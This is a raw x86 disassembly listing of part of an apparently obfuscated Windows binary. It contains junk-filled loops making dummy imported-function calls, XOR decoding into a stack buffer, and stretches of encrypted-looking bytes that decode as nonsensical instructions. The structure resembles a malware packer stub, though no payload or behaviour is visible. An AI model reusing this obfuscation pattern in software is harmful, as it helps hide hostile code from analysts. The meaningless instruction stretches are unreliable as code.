  411a8c:	and    BYTE PTR ds:0x77f2f9c1,0x6e
  411a93:	jmp    0x156c:0x8096c4f
  411a9a:	mov    ecx,0x2a3a4772
  411a9f:	cmp    DWORD PTR [edi-0x80],ebp
  411aa2:	inc    edx
  411aa3:	mov    al,0x4f
  411aa5:	xor    eax,0x597ce398
  411aaa:	adc    ah,BYTE PTR [ebx+0x4db791f4]
  411ab0:	test   al,0x3b
  411ab2:	jmp    0x925fb9fd
  411ab7:	out    0xe1,eax
  411ab9:	fdivr  DWORD PTR [eax]
  411abb:	push   ecx
  411abc:	inc    ecx
  411abd:	pop    esp
  411abe:	rol    DWORD PTR [eax+esi*2+0x4665b8ee],cl
  411ac5:	out    0x2e,eax
  411ac7:	cli    
  411ac8:	sbb    al,0xb
  411aca:	push   eax
  411acb:	cmp    eax,0x2bdbbeac
  411ad1:	jg     0x411af2
  411ad3:	out    0x42,al
  411ad5:	js     0x411b04
  411ad7:	test   eax,0x57e6ced9
  411adc:	adc    al,0xc7
  411ade:	mov    ebx,0x8e814e7d
  411ae3:	mov    eax,ds:0x9627e534
  411ae8:	mov    ecx,DWORD PTR [esp+ebx*4+0xb84320b]
  411aef:	mov    ds:0x2215bda4,al
  411af4:	pop    edx
  411af5:	bound  ecx,QWORD PTR [edx-0x80]
  411af8:	inc    esp
  411af9:	add    al,0xb3
  411afb:	mov    edx,0xec7c7b00
  411b00:	mov    dh,0x3f
  411b02:	jno    0x411ae5
  411b04:	adc    BYTE PTR [ebp-0x12],ch
  411b07:	cmp    al,0x67
  411b09:	xor    eax,0x9cad697c
  411b0e:	inc    BYTE PTR [esi+0x25]
  411b11:	mov    al,0x32
  411b13:	iret   
  411b14:	mov    ds:0x2a57c44d,eax
  411b19:	jp     0x411b82
  411b1b:	push   0xfffffff9
  411b1d:	xor    ah,BYTE PTR [ebp+0x4e]
  411b20:	aam    0xc2
  411b22:	cwde   
  411b23:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b24:	loopne 0x411ba2
  411b26:	jns    0x411b2c
  411b28:	mov    edx,0xe4863e4f
  411b2d:	stos   DWORD PTR es:[edi],eax
  411b2e:	icebp  
  411b2f:	int3   
  411b30:	les    di,DWORD PTR [ecx-0x56]
  411b34:	cs pop edi
  411b36:	(bad)  
  411b37:	xlat   BYTE PTR ds:[ebx]
  411b38:	lds    ecx,FWORD PTR [ebx+0x37]
  411b3b:	pop    ss
  411b3c:	push   0x79
  411b3e:	scas   al,BYTE PTR es:[edi]
  411b3f:	sbb    BYTE PTR [edi+esi*1-0x5c],bh
  411b43:	add    DWORD PTR [eax],esi
  411b45:	xor    eax,DWORD PTR [ebx-0x729ce8ef]
  411b4b:	xchg   edi,eax
  411b4c:	push   ss
  411b4d:	cmc    
  411b4e:	inc    edx
  411b4f:	sar    DWORD PTR ds:0x1239a5f3,0xe
  411b56:	push   cs
  411b57:	sub    cl,BYTE PTR [edi-0x9e97c53]
  411b5d:	and    bh,BYTE PTR [eax]
  411b5f:	sbb    eax,0x53f2bc07
  411b64:	imul   esi,DWORD PTR [ecx+0x375089b7],0x5ac10def
  411b6e:	pop    ds
  411b6f:	sub    BYTE PTR [edx+0x1f],ah
  411b72:	jno    0x411bac
  411b74:	jge    0x411bb6
  411b76:	cmp    BYTE PTR [ecx+0x4b],cl
  411b79:	out    0xf9,al
  411b7b:	cmp    BYTE PTR [eax+edx*8-0x1f],dl
  411b7f:	xchg   edi,eax
  411b80:	mov    bl,0x15
  411b82:	add    edi,DWORD PTR ds:0x9bb84fac
  411b88:	dec    ebp
  411b89:	adc    ch,BYTE PTR [edx+0x15d6fdf4]
  411b8f:	and    eax,0x651e4308
  411b94:	add    eax,0xec74a236
  411b99:	xchg   ecx,eax
  411b9a:	(bad)  
  411b9b:	ins    BYTE PTR es:[edi],dx
  411b9c:	aaa    
  411b9d:	imul   esi,DWORD PTR [eax+0x47],0xfffffff2
  411ba1:	push   ebx
  411ba2:	ret    0x2ebc
  411ba5:	jmp    0x411b5b
  411ba7:	jecxz  0x411ba6
  411ba9:	out    0x59,eax
  411bab:	dec    DWORD PTR [esi-0x23]
  411bae:	aam    0x96
  411bb0:	sub    bh,BYTE PTR [ebp-0x7dad9816]
  411bb6:	sbb    ecx,esi
  411bb8:	sub    ah,BYTE PTR [ebx+0xa5e6af9]
  411bbe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bbf:	(bad)  
  411bc0:	mov    DWORD PTR [ebp+0x6812666e],0x3326c3ca
  411bca:	shr    DWORD PTR [eax+0x4c90e8c3],cl
  411bd0:	xor    DWORD PTR [esi],esi
  411bd2:	outs   dx,DWORD PTR gs:[esi]
  411bd4:	loope  0x411c49
  411bd6:	loopne 0x411c2b
  411bd8:	add    BYTE PTR [ebx],bl
  411bda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bdb:	sub    eax,0xe5cad344
  411be0:	(bad)  
  411be2:	imul   ecx,edi,0x62
  411be5:	pop    edx
  411be6:	cmp    BYTE PTR [ecx-0x5d0ec762],bh
  411bec:	mov    bh,0x41
  411bee:	inc    esp
  411bef:	mov    esi,DWORD PTR [ebp+0x10]
  411bf2:	mov    DWORD PTR [esi+0x8],eax
  411bf5:	mov    eax,DWORD PTR [ebp+0x18]
  411bf8:	mov    esi,DWORD PTR [ebp+0x10]
  411bfb:	mov    DWORD PTR [esi+0xc],eax
  411bfe:	mov    eax,DWORD PTR [ebp+0x1c]
  411c01:	mov    esi,DWORD PTR [ebp+0x10]
  411c04:	mov    DWORD PTR [esi+0x10],eax
  411c07:	mov    eax,DWORD PTR [ebp+0x8]
  411c0a:	xor    eax,ecx
  411c0c:	add    eax,edx
  411c0e:	pop    esi
  411c0f:	leave  
  411c10:	ret    0x18
  411c13:	push   ebp
  411c14:	mov    ebp,esp
  411c16:	sub    esp,0x9c
  411c1c:	mov    ecx,DWORD PTR [ebp+0x8]
  411c1f:	sbb    DWORD PTR ds:0x426f29,edi
  411c25:	mov    eax,0x8a9d
  411c2a:	adc    DWORD PTR ds:0x426eb5,0x24b2
  411c34:	xor    ax,WORD PTR [ecx+0x20]
  411c38:	mov    DWORD PTR ds:0x426f0d,0x19
  411c42:	cmp    DWORD PTR ds:0x426f0d,0x0
  411c49:	je     0x411c79
  411c4f:	cmp    DWORD PTR ds:0x426f0d,0x23
  411c56:	jge    0x411c79
  411c5c:	jmp    0x411c67
  411c61:	call   DWORD PTR ds:0x42fa00
  411c67:	mov    ecx,DWORD PTR ds:0x426f0d
  411c6d:	dec    ecx
  411c6e:	mov    DWORD PTR ds:0x426f0d,ecx
  411c74:	jmp    0x411c42
  411c79:	mov    ecx,0x3b5f
  411c7e:	add    ax,cx
  411c81:	mov    DWORD PTR ds:0x426e85,0x19
  411c8b:	cmp    DWORD PTR ds:0x426e85,0x0
  411c92:	je     0x411ce1
  411c98:	cmp    DWORD PTR ds:0x426e85,0xc
  411c9f:	jg     0x411ce1
  411ca5:	jmp    0x411cb3
  411caa:	push   DWORD PTR [ebp-0x10]
  411cad:	call   DWORD PTR ds:0x42fa3c
  411cb3:	cmp    DWORD PTR ds:0x426e85,0xd
  411cba:	jne    0x411ccf
  411cc0:	xor    ecx,ecx
  411cc2:	or     ecx,DWORD PTR ds:0x426e85
  411cc8:	dec    ecx
  411cc9:	mov    DWORD PTR ds:0x426e85,ecx
  411ccf:	mov    ecx,DWORD PTR ds:0x426e85
  411cd5:	dec    ecx
  411cd6:	mov    DWORD PTR ds:0x426e85,ecx
  411cdc:	jmp    0x411c8b
  411ce1:	movzx  eax,ax
  411ce4:	mov    ecx,DWORD PTR ds:0x426f25
  411cea:	sub    DWORD PTR ds:0x426e89,ecx
  411cf0:	mov    DWORD PTR [ebp-0x10],eax
  411cf3:	mov    BYTE PTR [ebp-0x1],0x7a
  411cf7:	lea    eax,[ebp-0x1]
  411cfa:	mov    DWORD PTR [ebp-0xc],eax
  411cfd:	mov    al,BYTE PTR [ebp-0x1]
  411d00:	mov    ecx,DWORD PTR [ebp-0xc]
  411d03:	xor    al,0x81
  411d05:	sub    DWORD PTR ds:0x426f2d,0x318c
  411d0f:	add    al,0x6
  411d11:	sub    DWORD PTR ds:0x426ef5,0x54d2
  411d1b:	mov    BYTE PTR [ecx],al
  411d1d:	and    eax,eax
  411d1f:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411d26:	push   ebx
  411d27:	and    DWORD PTR ds:0x426e8d,0x0
  411d31:	mov    ecx,DWORD PTR ds:0x426e8d
  411d37:	inc    ecx
  411d38:	mov    DWORD PTR ds:0x426e8d,ecx
  411d3e:	cmp    DWORD PTR ds:0x426e8d,0x22
  411d45:	jg     0x411d8e
  411d4b:	jmp    0x411d81
  411d50:	push   0x70b5
  411d55:	push   0x7924
  411d5a:	push   0x4ec8
  411d5f:	push   0x56ca
  411d64:	push   0x88b0
  411d69:	push   0x70c2
  411d6e:	push   0x4f11
  411d73:	push   DWORD PTR [ebp-0x1c]
  411d76:	push   0x827e
  411d7b:	call   DWORD PTR ds:0x42fa04
  411d81:	cmp    DWORD PTR ds:0x426e8d,0x18
  411d88:	jb     0x411d31
  411d8e:	mov    DWORD PTR [ebp-0x8],0xf89c85b4
  411d95:	and    DWORD PTR ds:0x426ee1,0x0
  411d9f:	jmp    0x411daf
  411da4:	mov    eax,ds:0x426ee1
  411da9:	inc    eax
  411daa:	mov    ds:0x426ee1,eax
  411daf:	cmp    DWORD PTR ds:0x426ee1,0x10
  411db6:	jae    0x411e0b
  411dbc:	cmp    DWORD PTR ds:0x426ee1,0x6
  411dc3:	jb     0x411e0b
  411dc9:	jmp    0x411dee
  411dce:	push   0x426ebd
  411dd3:	push   0x863e
  411dd8:	push   DWORD PTR [ebp-0x14]
  411ddb:	push   DWORD PTR [ebp-0x28]
  411dde:	push   0x80d0
  411de3:	push   0x79b2
  411de8:	call   DWORD PTR ds:0x42fa40
  411dee:	cmp    DWORD PTR ds:0x426ee1,0x5
  411df5:	jne    0x411e06
  411dfb:	mov    eax,ds:0x426ee1
  411e00:	inc    eax
  411e01:	mov    ds:0x426ee1,eax
  411e06:	jmp    0x411da4
  411e0b:	mov    ecx,DWORD PTR [ebp-0x18]
  411e0e:	push   esi
  411e0f:	mov    eax,0x75108b3
  411e14:	xor    ecx,eax
  411e16:	mov    esi,0x3272fa
  411e1b:	push   edi
  411e1c:	add    ecx,esi
  411e1e:	jmp    0x411e3e
  411e23:	not    DWORD PTR ds:0x426ea5
  411e29:	mov    dl,BYTE PTR [ebp-0x1]
  411e2c:	mov    DWORD PTR ds:0x426f25,0x1eab
  411e36:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  411e3d:	inc    ecx
  411e3e:	mov    DWORD PTR ds:0x426ee1,0x6456
  411e48:	cmp    ecx,0x40
  411e4b:	mov    DWORD PTR ds:0x426ea9,0x5cb
  411e55:	jb     0x411e23
  411e5b:	sub    DWORD PTR ds:0x426ec5,0x4698
  411e65:	mov    edx,DWORD PTR [ebp-0x18]
  411e68:	xor    edx,eax
  411e6a:	add    edx,esi
  411e6c:	mov    DWORD PTR ds:0x426ea9,0x4896
  411e76:	jmp    0x411f44
  411e7b:	mov    edi,DWORD PTR [ebp+0x8]
  411e7e:	and    DWORD PTR ds:0x426e9d,0x0
  411e88:	jmp    0x411e9a
  411e8d:	mov    ecx,DWORD PTR ds:0x426e9d
  411e93:	inc    ecx
  411e94:	mov    DWORD PTR ds:0x426e9d,ecx
  411e9a:	cmp    DWORD PTR ds:0x426e9d,0x12
  411ea1:	jae    0x411ec4
  411ea7:	cmp    DWORD PTR ds:0x426e9d,0x1f
  411eae:	jg     0x411ec4
  411eb4:	jmp    0x411ebf
  411eb9:	call   DWORD PTR ds:0x42fa08
  411ebf:	jmp    0x411e8d
  411ec4:	mov    ecx,0x8a9d
  411ec9:	add    DWORD PTR ds:0x426f1d,0x3bc7
  411ed3:	xor    cx,WORD PTR [edi+edx*4+0x2]
  411ed8:	mov    edi,0x3b5f
  411edd:	or     DWORD PTR ds:0x426ec9,0x426e8d
  411ee7:	add    cx,di
  411eea:	movzx  ecx,cx
  411eed:	mov    DWORD PTR [ebp-0xc],ecx
  411ef0:	mov    ecx,DWORD PTR ds:0x426ee9
  411ef6:	sub    ecx,DWORD PTR ds:0x426e99
  411efc:	mov    DWORD PTR ds:0x426ee9,ecx
  411f02:	mov    ecx,DWORD PTR [ebp+0x8]
  411f05:	or     DWORD PTR ds:0x426f2d,0x426e89
  411f0f:	movzx  ecx,WORD PTR [ecx+edx*4]
  411f13:	adc    DWORD PTR ds:0x426ebd,0x426ef1
  411f1d:	xor    ecx,0x8a9d
  411f23:	xor    DWORD PTR ds:0x426ef5,0x426e95
  411f2d:	add    ecx,edi
  411f2f:	mov    edi,DWORD PTR [ebp-0xc]
  411f32:	mov    DWORD PTR ds:0x426f09,0x3565
  411f3c:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  411f43:	inc    edx
  411f44:	mov    ecx,0x1c2a
  411f49:	mov    ecx,DWORD PTR [ebp-0x10]
  411f4c:	cmp    edx,ecx
  411f4e:	jne    0x411e7b
  411f54:	sub    edx,0x34ee
  411f5a:	mov    ecx,DWORD PTR [ebp-0x18]
  411f5d:	xor    DWORD PTR ds:0x426ef9,ecx
  411f63:	mov    edx,DWORD PTR [ebp+0x10]
  411f66:	mov    DWORD PTR ds:0x426ec5,0x17
  411f70:	cmp    DWORD PTR ds:0x426ec5,0x0
  411f77:	je     0x411fcf
  411f7d:	cmp    DWORD PTR ds:0x426ec5,0x2
  411f84:	jl     0x411fcf
  411f8a:	jmp    0x411f9f
  411f8f:	push   0x4ca2
  411f94:	push   0x426035
  411f99:	call   DWORD PTR ds:0x42fa44
  411f9f:	cmp    DWORD PTR ds:0x426ec5,0x3
  411fa6:	jne    0x411fbb
  411fac:	xor    edi,edi
  411fae:	xor    edi,DWORD PTR ds:0x426ec5
  411fb4:	dec    edi
  411fb5:	mov    DWORD PTR ds:0x426ec5,edi
  411fbb:	xor    edi,edi
  411fbd:	add    edi,DWORD PTR ds:0x426ec5
  411fc3:	dec    edi
  411fc4:	mov    DWORD PTR ds:0x426ec5,edi
  411fca:	jmp    0x411f70
  411fcf:	xor    ecx,eax
  411fd1:	mov    DWORD PTR ds:0x426f21,0x1d
  411fdb:	cmp    DWORD PTR ds:0x426f21,0x0
  411fe2:	je     0x41201c
  411fe8:	cmp    DWORD PTR ds:0x426f21,0x2c
  411fef:	jg     0x41201c
  411ff5:	jmp    0x41200a
  411ffa:	push   0x426ed5
  411fff:	push   0x3809
  412004:	call   DWORD PTR ds:0x42fa48
  41200a:	mov    edi,DWORD PTR ds:0x426f21
  412010:	dec    edi
  412011:	mov    DWORD PTR ds:0x426f21,edi
  412017:	jmp    0x411fdb
  41201c:	add    ecx,esi
  41201e:	xor    edi,DWORD PTR ds:0x426ea9
  412024:	mov    DWORD PTR [edx],ecx
  412026:	mov    ecx,DWORD PTR [ebp-0x18]
  412029:	xor    ecx,eax
  41202b:	add    ecx,esi
  41202d:	and    edi,0x6cf8
  412033:	mov    DWORD PTR [ebp-0xc],ecx
  412036:	mov    DWORD PTR ds:0x426ea5,0x13
  412040:	cmp    DWORD PTR ds:0x426ea5,0x0
  412047:	je     0x41207a
  41204d:	cmp    DWORD PTR ds:0x426ea5,0x1f
  412054:	jge    0x41207a
  41205a:	jmp    0x412068
  41205f:	push   DWORD PTR [ebp-0x24]
  412062:	call   DWORD PTR ds:0x42fa0c
  412068:	mov    edi,DWORD PTR ds:0x426ea5
  41206e:	dec    edi
  41206f:	mov    DWORD PTR ds:0x426ea5,edi
  412075:	jmp    0x412040
  41207a:	mov    DWORD PTR [ebp+0x8],0xf89c85b5
  412081:	mov    DWORD PTR ds:0x426ea9,0x18
  41208b:	cmp    DWORD PTR ds:0x426ea9,0x0
  412092:	je     0x4120ec
  412098:	cmp    DWORD PTR ds:0x426ea9,0xa
  41209f:	ja     0x4120ec
  4120a5:	jmp    0x4120c0
  4120aa:	push   DWORD PTR [ebp-0x28]
  4120ad:	push   0x4ee1
  4120b2:	push   DWORD PTR [ebp-0x20]
  4120b5:	push   0x56ea
  4120ba:	call   DWORD PTR ds:0x42fa4c
  4120c0:	cmp    DWORD PTR ds:0x426ea9,0xb
  4120c7:	jne    0x4120da
  4120cd:	mov    ecx,DWORD PTR ds:0x426ea9
  4120d3:	dec    ecx
  4120d4:	mov    DWORD PTR ds:0x426ea9,ecx
  4120da:	mov    ecx,DWORD PTR ds:0x426ea9
  4120e0:	dec    ecx
  4120e1:	mov    DWORD PTR ds:0x426ea9,ecx
  4120e7:	jmp    0x41208b
  4120ec:	mov    DWORD PTR [ebp-0x14],0xf89c85a5
  4120f3:	adc    edi,edi
  4120f5:	mov    DWORD PTR [ebp-0x10],0xf89c95b5
  4120fc:	mov    ecx,DWORD PTR ds:0x426f19
  412102:	adc    DWORD PTR ds:0x426eb9,ecx
  412108:	mov    ecx,DWORD PTR [ebp-0x14]
  41210b:	movzx  edi,BYTE PTR ds:0x426ef5
  412112:	add    edi,DWORD PTR ds:0x426ed5
  412118:	mov    DWORD PTR ds:0x426ef5,edi
  41211e:	mov    DWORD PTR [ebp+0x8],ecx
  412121:	mov    ecx,DWORD PTR [ebp+0x8]
  412124:	mov    DWORD PTR ds:0x426eb1,0x11
  41212e:	cmp    DWORD PTR ds:0x426eb1,0x0
  412135:	je     0x4121a1
  41213b:	cmp    DWORD PTR ds:0x426eb1,0x9
  412142:	jl     0x4121a1
  412148:	jmp    0x412175
  41214d:	push   DWORD PTR [ebp-0x24]
  412150:	push   0x5b11
  412155:	push   0x5886
  41215a:	push   DWORD PTR [ebp-0xc]
  41215d:	push   DWORD PTR [ebp-0x28]
  412160:	push   0x128a
  412165:	push   0x1ff9
  41216a:	push   0x6625
  41216f:	call   DWORD PTR ds:0x42fa10
  412175:	cmp    DWORD PTR ds:0x426eb1,0xa
  41217c:	jne    0x41218f
  412182:	mov    edi,DWORD PTR ds:0x426eb1
  412188:	dec    edi
  412189:	mov    DWORD PTR ds:0x426eb1,edi
  41218f:	mov    edi,DWORD PTR ds:0x426eb1
  412195:	dec    edi
  412196:	mov    DWORD PTR ds:0x426eb1,edi
  41219c:	jmp    0x41212e
  4121a1:	xor    ecx,eax
  4121a3:	and    DWORD PTR ds:0x426ebd,0x0
  4121ad:	jmp    0x4121bf
  4121b2:	mov    edi,DWORD PTR ds:0x426ebd
  4121b8:	inc    edi
  4121b9:	mov    DWORD PTR ds:0x426ebd,edi
  4121bf:	cmp    DWORD PTR ds:0x426ebd,0x14
  4121c6:	jae    0x4121e9
  4121cc:	cmp    DWORD PTR ds:0x426ebd,0x1d
  4121d3:	jle    0x4121e9
  4121d9:	jmp    0x4121e4
  4121de:	call   DWORD PTR ds:0x42fa14
  4121e4:	jmp    0x4121b2
  4121e9:	add    ecx,esi
  4121eb:	mov    edi,DWORD PTR ds:0x426ec9
  4121f1:	mov    ecx,0xf641bea
  4121f6:	mov    edi,0x5a1eade
  4121fb:	mov    DWORD PTR ds:0x426ed5,0x1d19
  412205:	je     0x416e72
  41220b:	and    DWORD PTR ds:0x426e95,0x0
  412215:	jmp    0x412229
  41221a:	xor    ebx,ebx
  41221c:	xor    ebx,DWORD PTR ds:0x426e95
  412222:	inc    ebx
  412223:	mov    DWORD PTR ds:0x426e95,ebx
  412229:	cmp    DWORD PTR ds:0x426e95,0x1f
  412230:	jae    0x41225c
  412236:	cmp    DWORD PTR ds:0x426e95,0x2f
  41223d:	jl     0x41225c
  412243:	jmp    0x412257
  412248:	push   DWORD PTR [ebp-0x18]
  41224b:	push   DWORD PTR [ebp-0x18]
  41224e:	push   DWORD PTR [ebp-0x10]
  412251:	call   DWORD PTR ds:0x42fa18
  412257:	jmp    0x41221a
  41225c:	mov    edx,DWORD PTR [ebp+0x8]
  41225f:	mov    ebx,DWORD PTR ds:0x426ec5
  412265:	add    ebx,DWORD PTR ds:0x426ea1
  41226b:	mov    DWORD PTR ds:0x426ec5,ebx
  412271:	mov    ebx,DWORD PTR [ebp-0x8]
  412274:	xor    edx,eax
  412276:	sbb    DWORD PTR ds:0x426ea1,0x426edd
  412280:	xor    ebx,eax
  412282:	add    DWORD PTR ds:0x426e91,0x426ec5
  41228c:	sub    edx,ebx
  41228e:	sub    edx,esi
  412290:	sbb    DWORD PTR ds:0x426eb5,edi
  412296:	xor    edx,eax
  412298:	mov    DWORD PTR [ebp+0x8],edx
  41229b:	add    edx,0x4d69
  4122a1:	mov    edx,DWORD PTR [ebp+0x8]
  4122a4:	mov    ebx,DWORD PTR [ebp-0x58]
  4122a7:	lea    edx,[ebx+edx*1+0x5708f4]
  4122ae:	mov    DWORD PTR [ebp-0x58],edx
  4122b1:	mov    edx,DWORD PTR [ebp+0x8]
  4122b4:	xor    ebx,DWORD PTR ds:0x426f05
  4122ba:	mov    ebx,DWORD PTR [ebp-0x54]
  4122bd:	and    DWORD PTR ds:0x426f11,0x6a73
  4122c7:	add    edx,0x64f89a
  4122cd:	adc    DWORD PTR ds:0x426ea5,0x426ef1
  4122d7:	imul   edx,ebx
  4122da:	or     DWORD PTR ds:0x426eed,0x7801
  4122e4:	mov    DWORD PTR [ebp-0x54],edx
  4122e7:	and    DWORD PTR ds:0x426ea9,0x0
  4122f1:	mov    edx,DWORD PTR ds:0x426ea9
  4122f7:	inc    edx
  4122f8:	mov    DWORD PTR ds:0x426ea9,edx
  4122fe:	cmp    DWORD PTR ds:0x426ea9,0xa
  412305:	ja     0x41234d
  41230b:	jmp    0x412326
  412310:	push   DWORD PTR [ebp-0x18]
  412313:	push   0x70df
  412318:	push   DWORD PTR [ebp-0x28]
  41231b:	push   0x6818
  412320:	call   DWORD PTR ds:0x42fa1c
  412326:	cmp    DWORD PTR ds:0x426ea9,0x9
  41232d:	jne    0x412340
  412333:	mov    edx,DWORD PTR ds:0x426ea9
  412339:	inc    edx
  41233a:	mov    DWORD PTR ds:0x426ea9,edx
  412340:	cmp    DWORD PTR ds:0x426ea9,0x1f
  412347:	jb     0x4122f1
  41234d:	mov    edx,DWORD PTR [ebp+0x8]
  412350:	movzx  ebx,WORD PTR ds:0x426ef1
  412357:	sub    DWORD PTR ds:0x426eb9,ebx
  41235d:	mov    ebx,DWORD PTR [ebp-0x50]
  412360:	add    edx,0x242ebe9
  412366:	sbb    DWORD PTR ds:0x426ef1,0x426ee1
  412370:	and    edx,ebx
  412372:	mov    DWORD PTR [ebp-0x50],edx
  412375:	xor    edx,edx
  412377:	or     edx,DWORD PTR ds:0x426ed1
  41237d:	adc    DWORD PTR ds:0x426ec5,edx
  412383:	mov    edx,DWORD PTR [ebp+0x8]
  412386:	and    DWORD PTR ds:0x426f09,0x423
  412390:	mov    ebx,DWORD PTR [ebp-0x4c]
  412393:	and    DWORD PTR ds:0x426ee1,0x67c7
  41239d:	add    edx,ecx
  41239f:	mov    DWORD PTR ds:0x426ee1,0x22dc
  4123a9:	or     edx,ebx
  4123ab:	and    DWORD PTR ds:0x426f2d,0x602a
  4123b5:	mov    DWORD PTR [ebp-0x4c],edx
  4123b8:	and    DWORD PTR ds:0x426e8d,edx
  4123be:	mov    edx,DWORD PTR [ebp+0x8]
  4123c1:	mov    DWORD PTR ds:0x426ee9,0x1e
  4123cb:	cmp    DWORD PTR ds:0x426ee9,0x0
  4123d2:	je     0x41241c
  4123d8:	cmp    DWORD PTR ds:0x426ee9,0xf
  4123df:	jl     0x41241c
  4123e5:	jmp    0x4123f0
  4123ea:	call   DWORD PTR ds:0x42fa20
  4123f0:	cmp    DWORD PTR ds:0x426ee9,0x10
  4123f7:	jne    0x41240a
  4123fd:	mov    ebx,DWORD PTR ds:0x426ee9
  412403:	dec    ebx
  412404:	mov    DWORD PTR ds:0x426ee9,ebx
  41240a:	mov    ebx,DWORD PTR ds:0x426ee9
  412410:	dec    ebx
  412411:	mov    DWORD PTR ds:0x426ee9,ebx
  412417:	jmp    0x4123cb
  41241c:	mov    ebx,0xfdbe0321
  412421:	sub    ebx,edx
  412423:	sbb    edx,0x3018
  412429:	add    ebx,DWORD PTR [ebp-0x48]
  41242c:	sub    DWORD PTR ds:0x426e85,0x15fb
  412436:	mov    DWORD PTR [ebp-0x48],ebx
  412439:	mov    DWORD PTR ds:0x426f0d,0x10
  412443:	cmp    DWORD PTR ds:0x426f0d,0x0
  41244a:	je     0x4124a6
  412450:	cmp    DWORD PTR ds:0x426f0d,0x5
  412457:	jbe    0x4124a6
  41245d:	jmp    0x412478
  412462:	push   0x426000
  412467:	push   DWORD PTR [ebp-0x24]
  41246a:	push   DWORD PTR [ebp-0x14]
  41246d:	push   0x32fd
  412472:	call   DWORD PTR ds:0x42fa24
  412478:	cmp    DWORD PTR ds:0x426f0d,0x6
  41247f:	jne    0x412494
  412485:	xor    ebx,ebx
  412487:	or     ebx,DWORD PTR ds:0x426f0d
  41248d:	dec    ebx
  41248e:	mov    DWORD PTR ds:0x426f0d,ebx
  412494:	mov    ebx,DWORD PTR ds:0x426f0d
  41249a:	dec    ebx
  41249b:	mov    DWORD PTR ds:0x426f0d,ebx
  4124a1:	jmp    0x412443
  4124a6:	mov    edx,DWORD PTR [ebp+0x8]
  4124a9:	mov    ebx,DWORD PTR [ebp-0x44]
  4124ac:	add    edx,edi
  4124ae:	add    DWORD PTR ds:0x426ee5,0x5ab2
  4124b8:	xor    edx,ebx
  4124ba:	xor    DWORD PTR ds:0x426ebd,0x426e81
  4124c4:	mov    DWORD PTR [ebp-0x44],edx
  4124c7:	and    DWORD PTR ds:0x426f05,0x0
  4124d1:	mov    edx,DWORD PTR ds:0x426f05
  4124d7:	inc    edx
  4124d8:	mov    DWORD PTR ds:0x426f05,edx
  4124de:	cmp    DWORD PTR ds:0x426f05,0x28
  4124e5:	jg     0x412506
  4124eb:	jmp    0x4124f9
  4124f0:	push   DWORD PTR [ebp-0x1c]
  4124f3:	call   DWORD PTR ds:0x42fa28
  4124f9:	cmp    DWORD PTR ds:0x426f05,0x1d
  412500:	jb     0x4124d1
  412506:	mov    edx,DWORD PTR [ebp+0x8]
  412509:	xor    edx,eax
  41250b:	add    edx,esi
  41250d:	jne    0x41220b
  412513:	jmp    0x416e72
  412518:	mov    edx,DWORD PTR [ebp-0xc]
  41251b:	sub    edx,esi
  41251d:	xor    edx,eax
  41251f:	mov    DWORD PTR [ebp-0x5c],edx
  412522:	mov    edx,DWORD PTR [ebp-0x10]
  412525:	mov    ebx,DWORD PTR [ebp-0x8]
  412528:	xor    edx,eax
  41252a:	xor    ebx,eax
  41252c:	sub    edx,ebx
  41252e:	sub    edx,esi
  412530:	xor    edx,eax
  412532:	mov    DWORD PTR [ebp-0x10],edx
  412535:	mov    edx,DWORD PTR [ebp-0x14]
  412538:	mov    DWORD PTR [ebp+0x8],edx
  41253b:	jmp    0x4125b0
  412540:	mov    edx,DWORD PTR [ebp+0x8]
  412543:	mov    ebx,DWORD PTR [ebp-0x8]
  412546:	xor    edx,eax
  412548:	xor    ebx,eax
  41254a:	sub    edx,ebx
  41254c:	sub    edx,esi
  41254e:	xor    edx,eax
  412550:	mov    DWORD PTR [ebp+0x8],edx
  412553:	mov    edx,DWORD PTR [ebp+0x8]
  412556:	mov    ebx,DWORD PTR [ebp-0x58]
  412559:	lea    edx,[ebx+edx*1+0x5708f4]
  412560:	mov    DWORD PTR [ebp-0x58],edx
  412563:	mov    edx,DWORD PTR [ebp+0x8]
  412566:	mov    ebx,DWORD PTR [ebp-0x54]
  412569:	add    edx,0x64f89a
  41256f:	imul   edx,ebx
  412572:	mov    DWORD PTR [ebp-0x54],edx
  412575:	mov    edx,DWORD PTR [ebp+0x8]
  412578:	mov    ebx,DWORD PTR [ebp-0x50]
  41257b:	add    edx,0x242ebe9
  412581:	and    edx,ebx
  412583:	mov    DWORD PTR [ebp-0x50],edx
  412586:	mov    edx,DWORD PTR [ebp+0x8]
  412589:	mov    ebx,DWORD PTR [ebp-0x4c]
  41258c:	add    edx,ecx
  41258e:	or     edx,ebx
  412590:	mov    DWORD PTR [ebp-0x4c],edx
  412593:	mov    edx,DWORD PTR [ebp+0x8]
  412596:	mov    ebx,0xfdbe0321
  41259b:	sub    ebx,edx
  41259d:	add    ebx,DWORD PTR [ebp-0x48]
  4125a0:	mov    DWORD PTR [ebp-0x48],ebx
  4125a3:	mov    edx,DWORD PTR [ebp+0x8]
  4125a6:	mov    ebx,DWORD PTR [ebp-0x44]
  4125a9:	add    edx,edi
  4125ab:	xor    edx,ebx
  4125ad:	mov    DWORD PTR [ebp-0x44],edx
  4125b0:	mov    edx,DWORD PTR [ebp+0x8]
  4125b3:	xor    edx,eax
  4125b5:	add    edx,esi
  4125b7:	jne    0x412540
  4125bd:	jmp    0x414910
  4125c2:	push   esp
  4125c3:	pop    edi
  4125c4:	push   0x2e
  4125c6:	js     0x4125f6
  4125c8:	pop    eax
  4125c9:	imul   ebx,DWORD PTR [edx+0x12],0x69f27a6a
  4125d0:	jb     0x41261f
  4125d2:	sbb    BYTE PTR [ebx+0x7b],dh
  4125d5:	jnp    0x412588
  4125d7:	pushf  
  4125d8:	jnp    0x412655
  4125da:	ror    al,0x86
  4125dd:	sbb    eax,0x310734fe
  4125e2:	jae    0x4125b5
  4125e4:	cmp    eax,0x2b9bab93
  4125e9:	lds    edx,FWORD PTR [eax+ebx*1-0x8058e3b]
  4125f0:	inc    esi
  4125f1:	mov    WORD PTR [ebx+0x2b],?
  4125f4:	dec    edx
  4125f5:	and    al,0x7f
  4125f7:	xor    edx,edi
  4125f9:	in     eax,0xd7
  4125fb:	(bad)  
  4125fc:	loope  0x412641
  4125fe:	jle    0x412608
  412600:	iret   
  412601:	in     al,dx
  412602:	inc    ebx
  412603:	loop   0x4125b2
